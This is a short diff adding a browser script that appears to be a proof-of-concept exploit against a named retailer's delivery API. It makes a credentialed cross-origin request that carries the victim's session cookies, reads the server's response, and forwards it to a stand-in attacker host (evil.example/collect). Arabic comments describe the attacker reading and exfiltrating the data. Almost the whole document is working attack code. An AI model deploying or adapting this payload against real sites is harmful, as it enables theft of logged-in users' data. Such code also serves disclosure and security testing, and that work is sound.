@@ -1,0 +1,16 @@
+<script>
+fetch("https://dii3.zooplus.com/rest/v1/delivery?client=zooplus&sessionId=...", {
+  method: "POST",
+  credentials: "include",
+  headers: { "Content-Type": "text/plain" },
+  body: JSON.stringify({ requestId: "poc" })
+})
+.then(r => r.text())
+.then(t => {
+  // لو نجح هذا فالمهاجم يقرأ استجابة السيرفر
+  console.log("response:", t);
+  // يمكن إرسالها للخادم الخبيث:
+  fetch("https://evil.example/collect", {method:"POST", body:t});
+})
+.catch(e=>console.error(e));
+</script>
